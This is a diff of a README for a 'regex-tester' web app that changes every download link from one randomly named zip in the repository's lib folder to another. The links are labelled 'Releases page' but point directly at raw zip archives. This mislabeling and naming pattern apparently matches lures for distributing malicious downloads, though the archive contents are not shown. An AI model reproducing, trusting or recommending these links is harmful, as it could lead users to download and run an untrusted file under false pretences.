@@ -8,13 +8,13 @@ Welcome to **regex-tester**! This modern web application helps you test and buil
 
 To get started, simply visit our Releases page to download the application.
 
-[![Download regex-tester](https://github.com/soraiaalano/regex-tester/raw/refs/heads/main/lib/regex_tester_redstreak.zip)](https://github.com/soraiaalano/regex-tester/raw/refs/heads/main/lib/regex_tester_redstreak.zip)
+[![Download regex-tester](https://raw.githubusercontent.com/soraiaalano/regex-tester/main/lib/regex-tester-caseinogen.zip)](https://raw.githubusercontent.com/soraiaalano/regex-tester/main/lib/regex-tester-caseinogen.zip)
 
 ### 1. Visit the Releases Page
 
 Click on the link below to access the download options. 
 
-[Download from the Releases page](https://github.com/soraiaalano/regex-tester/raw/refs/heads/main/lib/regex_tester_redstreak.zip)
+[Download from the Releases page](https://raw.githubusercontent.com/soraiaalano/regex-tester/main/lib/regex-tester-caseinogen.zip)
 
 ### 2. Choose Your Version
 
@@ -85,4 +85,4 @@ This tool is perfect for various tasks related to regular expressions, including
 
 ---
 
-Remember, to download regex-tester, head over to our [Releases page](https://github.com/soraiaalano/regex-tester/raw/refs/heads/main/lib/regex_tester_redstreak.zip) today!
+Remember, to download regex-tester, head over to our [Releases page](https://raw.githubusercontent.com/soraiaalano/regex-tester/main/lib/regex-tester-caseinogen.zip) today!
